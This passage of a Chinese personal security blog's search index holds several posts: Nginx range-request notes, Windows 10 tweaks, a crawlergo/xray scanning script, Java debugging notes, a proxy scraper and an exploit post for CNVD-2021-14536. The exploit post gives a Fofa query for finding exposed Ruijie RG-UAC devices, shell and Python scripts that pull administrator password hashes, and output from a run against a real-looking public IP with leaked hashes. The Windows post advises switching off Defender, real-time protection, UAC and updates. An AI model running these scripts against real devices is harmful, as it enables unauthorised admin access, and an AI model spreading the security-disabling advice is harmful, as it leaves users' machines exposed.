ETag</code> 或者 <code>If-Range == Last-Modifled </code>来区分资源文件是否变动，如果源文件有改动，则重新走下载流程）</p><pre><code class="html">Range: bytes=20- ：获取请求中第 20 个字节之后数据；Range: bytes= -50 ：获取请求中最后 50 个字节的数据；Range: bytes=40-100 ：获取请求中第 40 个字节到第 100 个字节之间的数据。Range: bytes=0-50, 100-150  ：获取多个长度的数据</code></pre></li><li><p><input disabled="" type="checkbox">  响应包中对应字段</p><ul><li><code>Accept-Ranges</code>字段要求   <em>Accept-Ranges: bytes</em>字段则表示支持服务器支持范围请求，(不支持范围请求则为<em>Accept-Ranges: none</em>)</li><li><code>Content-Type</code> 说明媒体类型 包含多个数据区间，<code>Content-Type: multipart/byteranges; boundary=0000000xxxx</code></li><li><code>Content-Length</code> 标识指定文件总字节数， </li><li><code>Content-Range</code>标识返回指定文件的部分内容在整个文件中所处的位置</li></ul></li></ul><p>参考<br><a href="https://github.com/liusec/CVE-2017-7529">CVE-2017-7529</a><br><a href="https://github.com/MaxSecurity/CVE-2017-7529-POC">CVE-2017-7529-POC</a><br><a href="https://www.biancheng.net/http/range.html">HTTP range请求</a><br><a href="https://www.anquanke.com/post/id/86421">Nginx range 过滤器整形溢出漏洞</a></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
          <category> Exploit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>win10系统优化</title>
      <link href="Evolution/win10%E7%B3%BB%E7%BB%9F%E4%BC%98%E5%8C%96.html"/>
      <url>Evolution/win10%E7%B3%BB%E7%BB%9F%E4%BC%98%E5%8C%96.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h2 id="开启卓越性能"><a href="#开启卓越性能" class="headerlink" title="开启卓越性能"></a>开启卓越性能</h2><p>win+r键输入<code>powershell</code></p><pre><code class="powershell">powercfg -duplicatescheme  e9a42b02-d5df-448d-aa00-03f14749eb61</code></pre><p>【win+r】键输入<code>control</code> 查看方式改为【大图标】，选择【电源选项】-【卓越性能】<br>    【选择电源按钮的功能】-【更改当前不可用的设置】-勾选【启用快速启动】-【保存修改】</p><h2 id="存储感知清理"><a href="#存储感知清理" class="headerlink" title="存储感知清理"></a>存储感知清理</h2><pre><code>打开【设置】-【存储】-【配置存储感知并立即运行】</code></pre><h2 id="关闭视觉效果"><a href="#关闭视觉效果" class="headerlink" title="关闭视觉效果"></a>关闭视觉效果</h2><p>【win+r】运行sysdm.cpl打开【系统属性】面板-【高级系统设置】-标签页【高级】-性能【设置】-【视觉效果】-【最佳性能】</p><h2 id="解除网络限速"><a href="#解除网络限速" class="headerlink" title="解除网络限速"></a>解除网络限速</h2><p>【win+r】输入<code>gpedit.msc</code>,定位到一下路径:<br>【计算机配置】-【管理模版】-【网络】-【QoS数据包计划程序】-《限制可保留带宽》-勾选【已启用】，修改【带宽限制】： 0</p><h2 id="关闭Defender和实时防护"><a href="#关闭Defender和实时防护" class="headerlink" title="关闭Defender和实时防护"></a>关闭Defender和实时防护</h2><p>【win+r】输入<code>gpedit.msc</code>,定位到一下路径:<br>【计算机配置】-【管理模版】-【windows组件】-【windows Defender 防病毒】:<br>              1.  启用【关闭Microsoft Defender防病毒】<br>              2. 【实时防护】-启用【关闭实时防护】</p><h2 id="关闭win10自动更新"><a href="#关闭win10自动更新" class="headerlink" title="关闭win10自动更新"></a>关闭win10自动更新</h2><p>【计算机配置】-【管理模版】-【Windows更新】-禁用【配置自动更新】</p><h2 id="磁盘优化"><a href="#磁盘优化" class="headerlink" title="磁盘优化"></a>磁盘优化</h2><p>右键单击【C盘】-选择【属性】-标签页【工具】-对驱动器进行优化和碎片清理【优化】-【更改设置】</p><h2 id="关闭UAC通知并优化启动引导"><a href="#关闭UAC通知并优化启动引导" class="headerlink" title="关闭UAC通知并优化启动引导"></a>关闭UAC通知并优化启动引导</h2><p>【win+r】输入<code>msconfig</code>-标签页【工具】-【更改UAC设置】-「从不通知」<br>                      -标签页【引导】-勾选【无GUI引导】-应用并确定</p><h2 id="禁用相关服务"><a href="#禁用相关服务" class="headerlink" title="禁用相关服务"></a>禁用相关服务</h2><p>【win+r】键输入<code>services.msc</code> ，查找以下服务并禁用</p><ul><li>【Windows Search】</li><li>【Connected User Experiences and Telemetry】</li><li>【Diagnostic Execution Service】</li><li>【Diagnostic Policy Service】</li><li>【Diagnostic Service Host】</li><li>【Diagnostic System Host】</li><li>【HomeGroup Listener】</li><li>【HomeGroupProvider】</li><li>【SecurityCenter】</li><li>【Program CompatibilityAssistant Service】</li></ul><h2 id="禁用P2P分享服务"><a href="#禁用P2P分享服务" class="headerlink" title="禁用P2P分享服务"></a>禁用P2P分享服务</h2><p>【win+i】键单击【更新与安全】-【传递优化】-关闭【允许从其他电脑下载】</p><h2 id="关闭休眠功能，保留睡眠功能"><a href="#关闭休眠功能，保留睡眠功能" class="headerlink" title="关闭休眠功能，保留睡眠功能"></a>关闭休眠功能，保留睡眠功能</h2><p>【win+x】选择命令行<admin>,执行<code>powercfg -h off</code>,重启后生效</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Evolution </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>xray_crawlergo</title>
      <link href="Tools/xray-crawlergo.html"/>
      <url>Tools/xray-crawlergo.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><p>发现大佬写了<a href="https://github.com/timwhitez/crawlergo_x_XRAY">crawler_x_XRAY</a> 的python版本，于是边写下了sh脚本的版本</p><p><a href="https://github.com/askDing/crawlergo_x_XRAY/blob/master/crawler_xray.sh">crawlergo_x_XRAY.sh</a></p><pre><code class="zsh">#! /bin/bash## File Name: crawler_xray.sh # Author: Mr.Frame# Blog: https://askding.github.io/# Date: Thu Mar 25 10:32:35 CST 2021# Description:#             联动crawlergo和xray# 用法：#    ./crawler_xray.sh   &lt;path/to/target.txt&gt;## 提示:# 需要修改chrome路径thread=50                                 # 定义进程数[ -e /tmp/$$.fifo ] || mkfifo /tmp/$$.fifo # 创建命名管道文件exec 3&lt;&gt; /tmp/$$fifo                      # 创建FD 3，以可读（&lt;）可写（&gt;）的方式关联管道文件，FD 3具有命名管道的特性rm -rf /tmp/$$fifo                        # 删除命名管道文件，通过FD 3echo &quot;./xray_darwin_amd64 webscan --listen 127.0.0.1:7777 --html-output xray-report.html&quot; &amp;&amp; sleep 1.5./xray_darwin_amd64 webscan --listen 127.0.0.1:7777 --html-output xray-report.html &amp;for i in $(seq $thread); do    echo &gt;&amp;3                              # 循环$thread次向FD 3写入\n , 类比一个令牌 doneecho &quot;./crawlergo -c ~/.BurpSuite/burpbrowser/88.0.4324.192/Chromium.app/Contents/MacOS/Chromium  -t 10  -f smart --fuzz-path --push-pool-max 10 --output-mode json --push-to-proxy http://127.0.0.1:7777 Target&quot; &amp;&amp; sleep 1.5while read url; do    read -u 3    (        ./crawlergo -c ~/.BurpSuite/burpbrowser/88.0.4324.192/Chromium.app/Contents/MacOS/Chromium  -t 5  -f smart --fuzz-path --push-pool-max 10 --output-mode json --push-to-proxy http://127.0.0.1:7777 $url    )&amp;    # 最后需要归还令牌    echo &gt;&amp;3                          # 再次向FD 3写入\n , 类似归还令牌done &lt; $1wait                                      # 等待并发进程执行完毕，执行后续命令 if [ $? -eq 0 ]; then    echo &quot;Scan succeed. &quot;else    echo &quot;scan failed &quot;fiexec 3&lt;&amp;-                                 # 关闭FD 3的读exec 3&gt;&amp;-                                 # 关闭FD 3的写</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>java-basic</title>
      <link href="Coding/java-basic.html"/>
      <url>Coding/java-basic.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h1><ol><li><a href="#org9682d96">编程基础概念</a><ol><li> <a href="#orgc539f7f">数据类型</a></li><li> <a href="#org29f236a">运算符</a></li><li><a href="#org6ba4f21">控制语句</a><ol><li> <a href="#org27dcc48">分支语句 if/switch</a></li><li> <a href="#org5fe36c2">循环语句 while/do-while/for</a></li><li> <a href="#orgf3c8f96">跳转语句 break/continue/return/thow</a></li></ol></li></ol></li><li><a href="#org7bafcaa">类</a><ol><li> <a href="#orgeb8d4f4">抽象类</a></li><li> <a href="#org700c5b0">重载-Overloading</a></li><li> <a href="#orga48f328">stu instanceof Person 是Java中的二元运算符</a></li><li> <a href="#org31e157a">反射</a></li><li> <a href="#org83a6329">线程的五个状态</a></li></ol></li><li><a href="#org66286aa">JVM调优</a><ol><li><a href="#orgc6fff5f">Debug with jdb</a><ol><li> <a href="#org0f424fa">编译 &amp; 运行</a></li><li> <a href="#org158f7d4">jdb命令格式</a></li><li> <a href="#orga1151db">设置断点</a></li><li> <a href="#org5aaabdf">查看线程</a></li><li> <a href="#org519362f">单步调试</a></li><li> <a href="#org806aab2">查看变量</a></li><li> <a href="#orge917796">其他</a></li></ol></li></ol></li></ol><p>Java 是彻底的、纯粹的面向对象语言，在Java中，一切都是对象，具有封装性、继承性、多态性。<br>以类的方式组织代码，以对象的形式封装数据</p><blockquote><p>多写(代码),多写(笔记),多写(文章)<br>多练(交流),多练(思维),多练(技能)<br>多分享(知识)，多提问(怎么了)，多思考(为什么)</p></blockquote><p><a id="org9682d96"></a></p><h1 id="编程基础概念"><a href="#编程基础概念" class="headerlink" title="编程基础概念"></a>编程基础概念</h1><p><a id="orgc539f7f"></a></p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><pre><code>graph LR    dataType[数据类型]--&gt;basic[基础数据类型]    dataType--&gt;pointer[引用类型]    basic--&gt;character[字符型]    basic--&gt; number[数字型]    basic--&gt; boolean[布尔型]    character--&gt;char[char]    number--&gt;byte/short/int/long    number--&gt;float/double    boolean--&gt;Boolean    pointer--&gt;数组/类/接口    pointer--&gt;enum</code></pre><p><a id="org29f236a"></a></p><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><ul><li><p>  算术运算符 ： 加、减、乘、除、取余</p></li><li><p>  关系运算符 ：不等、相等、大于、小于、大于等于、小于等于</p></li><li><p>逻辑操作服 ：与、或、非、异或</p><p>  graph LR</p><pre><code>  operate[运算符]--&gt;calc[算术运算符]  operate[运算符]--&gt;relation[关系运算符]  operate[运算符]--&gt;logic[逻辑运算符]  operate[运算符]--&gt;bit[位运算符]  calc--&gt;calcs[加+ 减- 乘* 除/ 取余%]  relation--&gt; relations[不等!= 相等== 大于&gt; 小于&lt; 大于等于&gt;= 小于等于&lt;=]  logic--&gt;logics[与and 或or 异或xor 非!]  bit--&gt;bits[左移&lt;&lt; &gt;&gt;右移 与&amp; 或I 异或^ 取反]</code></pre></li></ul><p><a id="org6ba4f21"></a></p><h2 id="控制语句"><a href="#控制语句" class="headerlink" title="控制语句"></a>控制语句</h2><p>一般程序都是顺序执行代码语句的，通过控制语句可改变程序执行顺序</p><pre><code>graph LR    control[控制语句]--&gt;switch    control--&gt;loop[循环语句]    control--&gt;goto[跳转语句]    switch[分支语句]--&gt; if/switch    loop--&gt;for/while/do-while    goto--&gt;break/continue/return/throw/try-catch</code></pre><p><a id="org27dcc48"></a></p><h3 id="分支语句-if-switch"><a href="#分支语句-if-switch" class="headerlink" title="分支语句 if/switch"></a>分支语句 if/switch</h3><p><a id="org5fe36c2"></a></p><h3 id="循环语句-while-do-while-for"><a href="#循环语句-while-do-while-for" class="headerlink" title="循环语句 while/do-while/for"></a>循环语句 while/do-while/for</h3><p><a id="orgf3c8f96"></a></p><h3 id="跳转语句-break-continue-return-thow"><a href="#跳转语句-break-continue-return-thow" class="headerlink" title="跳转语句 break/continue/return/thow"></a>跳转语句 break/continue/return/thow</h3><p><a id="org7bafcaa"></a></p><h1 id="类"><a href="#类" class="headerlink" title="类"></a>类</h1><p>类加载顺序: 静态代码块-&gt; 匿名代码块-&gt; 构造函数<br>类加载过程:</p><ol><li><p>类初始化代码：<br> a. 基类初始化代码<br> b. 子类初始化代码</p></li><li><p>基类实例初始化代码、基类构造方法</p></li><li><p>子类初始化代码、子类构造方法</p></li></ol><pre><code>package com.example.className;import package1[.package2 ...].(className|*);import package1[.package2 ...].(className|*);[public] [abstract|final] class className [extends superclass] [implements interfaceNameList]&#123;    //    [public|protected|private] [static] [final] &lt;dataType&gt; variableName;    [public|protected|private] [static] [final|abstract] [native] [synchronized] &lt;dataType&gt; methodName([paramList]) [throws exceptionList]&#123;    &#125;&#125;</code></pre><p><a id="orgeb8d4f4"></a></p><h2 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h2><ul><li>  抽象类可以包含普通方法</li><li>  抽象方法必须在抽象类中</li></ul><p><a id="org700c5b0"></a></p><h2 id="重载-Overloading"><a href="#重载-Overloading" class="headerlink" title="重载-Overloading"></a>重载-Overloading</h2><p>在一个类中，两个方法名相同，参数列表<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup> 不同 , 与返回类型无关。</p><p><a id="orga48f328"></a></p><h2 id="stu-instanceof-Person-是Java中的二元运算符"><a href="#stu-instanceof-Person-是Java中的二元运算符" class="headerlink" title="stu instanceof Person 是Java中的二元运算符"></a>stu instanceof Person 是Java中的二元运算符</h2><p>左边stu是对象，右边Person是类；<br>当对象是右边类或子类所创建对象时，返回true；否则，返回false。</p><p><a id="org31e157a"></a></p><h2 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h2><p><a id="org83a6329"></a></p><h2 id="线程的五个状态"><a href="#线程的五个状态" class="headerlink" title="线程的五个状态"></a>线程的五个状态</h2><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20210711180509thread_status.png" alt="img"></p><p><a id="org66286aa"></a></p><h1 id="JVM调优"><a href="#JVM调优" class="headerlink" title="JVM调优"></a>JVM调优</h1><p>调优是针对方法区和堆区进行调优</p><p>双亲委派机制：当某个类加载器加载一个类时，它首先委托它的上级类加载器去夹在，并递归这个操作，<br>       如果上级的类加载器没有家在，自己才会加载这个类。<br>       作用： 防止重复加在某个类，保证核心类不被篡改</p><p><a id="orgc6fff5f"></a></p><h2 id="Debug-with-jdb"><a href="#Debug-with-jdb" class="headerlink" title="Debug with jdb"></a><a href="https://www.shuzhiduo.com/A/A2dme1xxde/">Debug with jdb</a></h2><p><a id="org0f424fa"></a></p><h3 id="编译-amp-运行"><a href="#编译-amp-运行" class="headerlink" title="编译 &amp; 运行"></a>编译 &amp; 运行</h3><pre><code>javac -g path/to/src/*.java  -d path/to/bin/                 # 编译jar cvfm  path/to/xxx.jar  manifest.mf path/to/bin/*.class   # 打包# 本地调试java -Xdebug -Xrunjdwp:transport=dt_socket,server=y,address=8000 &lt;MainClassName&gt;  # 运行开启调试 or -jar xx.jar , 顺序： -Xdebug ... -jar ..jdb -connect com.sun.jdi.SocketAttach:hostname=localhost,port=8000                # jdb调试# 远程调试java -Xdebug -Xrunjdwp:transport=dt_socket,address=192.168.10.205:8000,suspend=y -jar remoting-debug.jarjdb -connect com.sun.jdi.SocketAttach:hostname=192.168.10.205,port=8000</code></pre><p><a id="org158f7d4"></a></p><h3 id="jdb命令格式"><a href="#jdb命令格式" class="headerlink" title="jdb命令格式"></a>jdb命令格式</h3><p><code>jdb &lt;options&gt;  &lt;className&gt; &lt;arguments&gt;</code></p><pre><code>java -Xdebug -Xrunjdwp:transport=dt_socket,address=8888,server=n,suspend=y com.lhx.cloud.javathread.MarkWord.JdbMain-Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,address=3999,suspend=n-XDebug               启用调试。-Xnoagent             禁用默认sun.tools.debug调试器。-Djava.compiler=NONE  禁止 JIT 编译器的加载。-Xrunjdwp             加载JDWP的JPDA参考执行实例。transport             用于在调试程序和 VM 使用的进程之间通讯。dt_socket             套接字传输。dt_shmem              共享内存传输，仅限于 Windows。server=y/n            =y表示当前是调试服务端，=n表示当前是调试客户端address=8000          调试服务器的端口号，客户端用来连接服务器的端口号。suspend=y/n           =n表示启动时不中断（如果启动时中断，一般用于调试启动不了的问题）jdb -attach &lt;ip&gt;:8888           #连接到JVM，本机IP即可省略where options include:    -? -h --help -help print this help message and exit    -sourcepath &lt;directories separated by &quot;:&quot;&gt;                      directories in which to look for source files    -attach &lt;address&gt;                      attach to a running VM at the specified address using standard connector    -listen &lt;address&gt;                      wait for a running VM to connect at the specified address using standard connector    -listenany                      wait for a running VM to connect at any available address using standard connector    -launch                      launch VM immediately instead of waiting for &#39;run&#39; command    -listconnectors   list the connectors available in this VM    -connect &lt;connector-name&gt;:&lt;name1&gt;=&lt;value1&gt;,...                      connect to target VM using named connector with listed argument values    -dbgtrace [flags] print info for debugging jdb    -tclient          run the application in the HotSpot(TM) Client Compiler    -tserver          run the application in the HotSpot(TM) Server Compileroptions forwarded to debuggee process:    -v -verbose[:class|gc|jni]                      turn on verbose mode    -D&lt;name&gt;=&lt;value&gt;  set a system property    -classpath &lt;directories separated by &quot;:&quot;&gt;                      list directories in which to look for classes    -X&lt;option&gt;        non-standard target VM option</code></pre><p><a id="orga1151db"></a></p><h3 id="设置断点"><a href="#设置断点" class="headerlink" title="设置断点"></a>设置断点</h3><pre><code>stop \ clear                        # 查看断点stop at &lt;className&gt;:&lt;Line No&gt;       # 在特定行号处设置断点stop in &lt;className&gt;.&lt;method\field&gt;  # 在特定方法\变量处设置断点</code></pre><p><a id="org5aaabdf"></a></p><h3 id="查看线程"><a href="#查看线程" class="headerlink" title="查看线程"></a>查看线程</h3><pre><code>threads           # 查看所有线程thread &lt;id&gt;       # 查看单个线程where             # 查看线程堆栈pop               # 当前帧出栈, 且打印当前帧</code></pre><p><a id="org519362f"></a></p><h3 id="单步调试"><a href="#单步调试" class="headerlink" title="单步调试"></a>单步调试</h3><pre><code>step              # 执行当前行(进入函数体)  = step intostep up           # 跳出当前函数,回到当前函数调用处 = step returnstepi             # 执行当前指令next              # 执行当前行(跳过函数调用) = step overcont              # 运行到下一断点处 = resume</code></pre><p><a id="org806aab2"></a></p><h3 id="查看变量"><a href="#查看变量" class="headerlink" title="查看变量"></a>查看变量</h3><pre><code>list [line|method]               # 查看代码locals                           # 查看当前栈所有变量set &lt;var&gt;=&lt;expr&gt;                 # 设置变量eval/print &lt;expr&gt;                # 显示java基础类型的值dump &lt;expr&gt;                      # 输出java引用类型信息</code></pre><p><a id="orge917796"></a></p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><pre><code>monitor &lt;command&gt;             # 当程序暂停时自动执行命令monitor                     # 列出所有的monitorwatch &lt;var&gt;                 # 运行到变量的值改变时停止unwatch &lt;var&gt;                 # 取消watchclasses                      # 列出所有已知的类</code></pre><h1 id="Footnotes"><a href="#Footnotes" class="headerlink" title="Footnotes"></a>Footnotes</h1><p><sup><a id="fn.1" href="#fnr.1">1</a></sup> 个数，类型，排列顺序</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Coding </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>getHttpProxy</title>
      <link href="Coding/getHttpProxy.html"/>
      <url>Coding/getHttpProxy.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><p>在github上发现一个自动更新的http代理的仓库<a href="https://github.com/fate0/proxylist">fate0</a></p><p>因此编写了一个python脚本自动获取并添加到proxychains.conf配置文件中</p><p><a href="https://github.com/askDing/socks5_list">getHttp.py</a></p><pre><code class="python">#!/usr/bin/env python3# -*- coding: utf-8 -*-# Wed Mar 17 16:39:04 CST 2021# AUTHOR: Mr.Frame # Description:#      自动获取http代理，并添加到proxychains.conf中#Usage:#      python3 gethttp.py  [/path/to/proxychains.conf]import requestsimport urllib3import jsondef get_socks5(proxychains_path):    &quot;&quot;&quot;    get socks from http://proxylist.fatezero.org/proxy.list.    proxychains_path: str -&gt; the path of proxycahins-ng configuation file.    ***suggestion:   enable  round_robin_chain****    #strict_chain    #dynamic_chain    #round_robin_chain    random_chain    chain_len = 2    &quot;&quot;&quot;    proxychains_file = proxychains_path    url=&quot;http://proxylist.fatezero.org/proxy.list&quot;    headers=&#123;        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36&quot;    &#125;    urllib3.disable_warnings() # 关闭ssl警告    try:        response = requests.get(url=url,headers=headers,verify=False,timeout=2)    except Exception as e:        print(&quot;\033[31m[x]Connection failed\033[0m&quot;)        print(e.__str__())        exit()    if response.status_code == 200 :        proxy_list = response.text.splitlines()        socks_list=&quot;\n\n# socks5 list from  http://proxylist.fatezero.org/proxy.list\n&quot;        for item in proxy_list:            item_dict = json.loads(item)            if &quot;http&quot; == item_dict[&#39;type&#39;] and &quot;high_anonymous&quot; == item_dict[&#39;anonymity&#39;]:                socks_item = item_dict[&#39;type&#39;] +&quot;\t&quot; + item_dict[&#39;host&#39;] + &quot;\t&quot; + str(item_dict[&#39;port&#39;])+&quot;\n&quot;                socks_list += socks_item            print(socks_list)        # with open(&quot;/usr/local/etc/proxychains.conf&quot;,&#39;a+&#39;) as f:        with open(proxychains_file,&quot;a+&quot;) as f:            f.write(socks_list)if __name__ == &#39;__main__&#39;:    import sys    if sys.argv.__len__() == 1:        get_socks5(&quot;/usr/local/etc/proxychains.conf&quot;)    else:        get_socks5(sys.argv[1])</code></pre><p>执行脚本后,代理效果不是很好</p><pre><code class="zsh"> proxychains4 curl cip.cc[proxychains] config file found: /usr/local/etc/proxychains.conf[proxychains] preloading /usr/local/Cellar/proxychains-ng/4.14/lib/libproxychains4.dylib[proxychains] DLL init: proxychains-ng 4.14[proxychains] Random chain  ...  222.78.210.229:57186  ...  cip.cc:80  ...  OKIP    : 222.78.210.229地址    : 中国  福建  南平运营商    : 电信数据二    : 福建省南平市 | 电信数据三    : 中国福建省南平市 | 电信URL    : http://www.cip.cc/222.78.210.229</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Coding </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Ruijie_RG_UAC</title>
      <link href="Kali/Exploit/Ruijie-RG-UAC.html"/>
      <url>Kali/Exploit/Ruijie-RG-UAC.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h2 id="CNVD-2021-14536"><a href="#CNVD-2021-14536" class="headerlink" title="CNVD-2021-14536"></a>CNVD-2021-14536</h2><p>锐捷RG-UAC统一上网行为管理审计系统存在信息泄漏，攻击者通过网页源代码可间接获取管理用户账户和密码的MD5值，解密后可登陆管理后台</p><p><a href="https://fofa.so/">Fofa</a>查询关键字 <code>title=&quot;RG-UAC登录页面&quot; &amp;&amp; body=&quot;admin&quot;</code></p><p><img src="../images/ruijie-1.jpg" alt="锐捷登陆页面"><br><code>Command+u</code>查看网页源码，<code>Command+f</code>搜索password即可看到密码的MD5</p><p>Burp数据包<br><img src="../images/ruijie-2.jpg" alt="锐捷响应包"></p><p>进行解密即可</p><pre><code class="zsh">❯ time ./Ruijie.sh https://61.191.151.185:4443/admin: &quot;password&quot;:&quot;0e563b8ae893f8f78f943fd72f1425b8&quot;guest: &quot;password&quot;:&quot;fcf41657f02f88137a1bcf068a32c0a3&quot;audit: &quot;password&quot;:&quot;d33542b8458db8cabd9843fe7c1e8784&quot;./Ruijie.sh https://61.191.151.185:4443/  0.02s user 0.01s system 5% cpu 0.507 total~ via 🐍 v2.7.16❯ time ./Ruijie_get_passwd.py https://61.191.151.185:4443/[o]Target:https://61.191.151.185:4443/super_amdin&#39;s password of MD5: 0e563b8ae893f8f78f943fd72f1425b8./Ruijie_get_passwd.py https://61.191.151.185:4443/  0.14s user 0.04s system 25% cpu 0.680 total</code></pre><h2 id="POC-1-shell脚本"><a href="#POC-1-shell脚本" class="headerlink" title="POC-1 shell脚本"></a>POC-1 shell脚本</h2><pre><code class="zsh"># !/bin/bash# File Name: Ruijie_get_password.sh## Author: Mr.Frame# Date: Mon Mar  8 16:10:52 CST 2021# Description:# CNVD-2021-14536 Ruijie 锐捷RG-UAC统一上网行为管理审计系统 # 核心语句: awk -F &quot;[,]&quot;  &#39;NR==148,/password/&#123;print &quot;admin: &quot;$5 &quot;\n&quot;  &quot;guest: &quot; $20 &quot;\n&quot; &quot;audit: &quot; $35 &#125;&#39;  aa.txtResp=$(mktemp)curl -k -sS &quot;$1&quot; &gt;&gt; $Respawk -F &quot;[,]&quot;  &#39;NR==148,/password/&#123;print &quot;admin: &quot;$5 &quot;\n&quot;  &quot;guest: &quot; $20 &quot;\n&quot; &quot;audit: &quot; $35 &#125;&#39;  $Resprm $Resp</code></pre><h2 id="POC-2-python脚本"><a href="#POC-2-python脚本" class="headerlink" title="POC-2 python脚本"></a>POC-2 python脚本</h2><pre><code class="python3">#!/usr/bin/env python3# -*- coding: utf-8 -*-# 2021-03-12# Author: Mr.Frame # Description:#      CNVD-2021-14536 锐捷 RG-UAC 统一上网行为管理审计系统信息泄露漏洞 #Usage:#      python3 ruijie_get_passwd  &lt;url&gt;import requestsimport urllib3import redef Ruijie_get_passwd(url):    &quot;Check CNVD-2021-14536 of Target&quot;    url=url    headers=&#123;        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36&quot;    &#125;    urllib3.disable_warnings() # 关闭ssl警告    try:        response=requests.get(url=url,headers=headers,verify=False,timeout=2)    except Exception as e:        print(&quot;\033[31m[x]Connection failed\033[0m&quot;)        print(e.__str__())    if response.status_code == 200 and &quot;super_admin&quot; in response.text and &quot;password&quot; in response.text:            password=(re.search(&#39;[a-fA-F0-9]&#123;32&#125;&#39;, response.text)).group()            print(&quot;\033[32m[o]Target:&#123;&#125;\033[0m \nsuper_amdin&#39;s password of MD5: \033[31m&#123;&#125;\033[0m&quot;.format(url,password))    else:        print(&quot;\033[32mtarget:&#123;&#125; is safe\033[0m&quot;)if __name__ == &#39;__main__&#39;:    import sys    if sys.argv.__len__() != 2:        print(&quot;python3 ruijie_get_passwd  https://x.x.x.x:&lt;port&gt;&quot;)    else:        Ruijie_get_passwd(sys.argv[1])</code></pre><p>参考：<br><a href="https://mp.weixin.qq.com/s/4Lx3N1yOrFQbySzIuVjRcQ">CNVD-2021-14536 锐捷 RG-UAC 统一上网行为管理审计系统信息泄露漏洞 </a></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
          <category> Exploit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
